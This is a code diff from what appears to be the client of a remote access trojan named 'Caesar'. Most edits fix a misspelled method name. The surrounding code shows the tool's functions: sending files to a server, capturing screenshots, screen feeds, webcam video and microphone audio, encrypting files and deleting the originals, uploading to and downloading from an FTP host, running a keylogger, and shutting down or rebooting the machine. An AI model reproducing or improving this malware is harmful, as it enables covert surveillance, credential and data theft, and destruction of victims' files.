@@ -13,7 +13,7 @@ import imutils
 import pyaudio
 import ftplib
 import threading
-from Keylogger import Keylogger
+from keylogger import Keylogger
 
 
 
@@ -28,7 +28,7 @@ class GeneralFeatures:
             self.stop_event = threading.Event()
 
 
-        def convvert_text_bold_red(self, text):
+        def convert_text_bold_red(self, text):
             RESET = "\033[0m"
             BOLD = "\033[1m"
             COLOR = "\u001b[36m"
@@ -41,9 +41,9 @@ class GeneralFeatures:
                 conn.send(usrFile.encode())
                 # checks if file exists
                 if not os.path.exists(usrFile):
-                    conn.send("File does not exist!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("File does not exist!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                 else:
-                    conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                     time.sleep(1)
                     fileSize = os.path.getsize(usrFile)
                     conn.send(str(fileSize).encode())
@@ -62,7 +62,7 @@ class GeneralFeatures:
                                 data = file.read(1024)
                             file.close()
             except:
-                conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
         # receives file from server
@@ -72,7 +72,7 @@ class GeneralFeatures:
 
                 if fileSize == 0:  # if file is empty do nothing
                     # send current working directory back to server
-                    conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                 else:
                     with open(usrFile, 'wb') as file:
                         if fileSize < 1024:
@@ -89,16 +89,16 @@ class GeneralFeatures:
                                 data = conn.recv(1024)
                             file.write(data)
                             file.close()
-                    conn.send("File sent!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("File sent!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             except:
-                conn.send("Error occurred sending file!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("Error occurred sending file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
 
         # sends screenshot back to server
         def screenshot(self, conn):
             try:
-                conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())  # send current working directory back to server
+                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())  # send current working directory back to server
                 img = ImageGrab.grab()  # capture image
                 img_np = np.array(img)
                 frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
@@ -123,7 +123,7 @@ class GeneralFeatures:
 
         #sends live feed of screen recording back to server
         def live_screen_feed(self, conn):
-            conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+            conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             img_counter = 0
             try:
                 while True:
@@ -145,7 +145,7 @@ class GeneralFeatures:
 
         # sends live feed of webcam back to server
         def capture_webcam_video(self, conn):
-            conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+            conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             cam = cv2.VideoCapture(0)
 
             img_counter = 0
@@ -176,7 +176,7 @@ class GeneralFeatures:
 
         #sends camshot from webcam back to server
         def webcam_capture(self, conn):
-            conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+            conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
             try:
                 capture = cv2.VideoCapture(0)
@@ -232,12 +232,12 @@ class GeneralFeatures:
                             usrFile.close()
                         os.remove(filename)
 
-                    conn.send("[-] File has been encrypted!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[-] File has been encrypted!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                 else:
-                    conn.send("[-] Unable to encrypt file!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[-] Unable to encrypt file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                     pass
             except:
-                conn.send("[-] Unable to encrypt file!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[-] Unable to encrypt file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
 
@@ -266,18 +266,18 @@ class GeneralFeatures:
                             decrypted_file.truncate(filesize)
 
                     os.remove(filename)
-                    conn.send("[+] File has been decrypted!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[+] File has been decrypted!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                 else:
-                    conn.send("[-] File does not exist!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[-] File does not exist!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             except:
-                conn.send("[-] Unable to decrypt file!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[-] Unable to decrypt file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
 
         #send microphone audio stream back to the server
         def live_audio_feed(self, conn):
             try:
-                conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
                 chunk = 20000
                 FORMAT = pyaudio.paInt16
@@ -341,9 +341,9 @@ class GeneralFeatures:
                     ftp.storbinary(f"STOR {filename}", file)
                 ftp.quit()
 
-                conn.send("[+] File has been uploaded!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[+] File has been uploaded!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             except:
-                conn.send("[-] Something went wrong uploading file!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[-] Something went wrong uploading file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
         #downloads file from ftp server
@@ -360,11 +360,11 @@ class GeneralFeatures:
                     ftp.retrbinary(f"RETR {filename}", file.write)
                 ftp.quit()
 
-                conn.send("[+] File has been Downloaded!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[+] File has been Downloaded!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
             except Exception as e:
                 print(e)
-                conn.send("[-] Something went wrong downloading file: {e} \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[-] Something went wrong downloading file: {e} \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
         #===================================================FTP FILE HANDLING===========================================
@@ -378,9 +378,9 @@ class GeneralFeatures:
             try:
                 self.KeyloggerThread = threading.Thread(target=self.Keylogger.start_keylogger, args=(filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS))
                 self.KeyloggerThread.start()
-                conn.send("[+] Keylogger started!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[+] Keylogger started!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             except:
-                conn.send("[-] Unable to start keylogger!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[-] Unable to start keylogger!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
         #stops keylogger thread
@@ -389,12 +389,12 @@ class GeneralFeatures:
                 if self.KeyloggerThread.is_alive():
                     self.Keylogger.stop_timer()
                     self.KeyloggerThread.join()
-                    conn.send("[+] Keylogger stopped!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[+] Keylogger stopped!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                 else:
-                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             except Exception as e:
                 #print(e)
-                conn.send("[-]Error occurred while stopping keylogger!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(
+                conn.send("[-]Error occurred while stopping keylogger!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(
                     os.getcwd() + ": ").encode())
 
 
@@ -402,11 +402,11 @@ class GeneralFeatures:
         def is_keylogger_active(self, conn):
             try:
                 if self.KeyloggerThread.is_alive():
-                    conn.send("[+] Keylogger is active!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[+] Keylogger is active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
                 else:
-                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
             except:
-                conn.send("[+] Keylogger is not active!!! \n".encode() + self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
         # ===================================================Keylogger==================================================
 
@@ -417,7 +417,7 @@ class GeneralFeatures:
             try:
                 os.system("shutdown /s /t 0")
             except:
-                conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
         #reboot system
@@ -425,5 +425,5 @@ class GeneralFeatures:
             try:
                 os.system("shutdown -t 0 -r -f")
             except:
-                conn.send(self.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
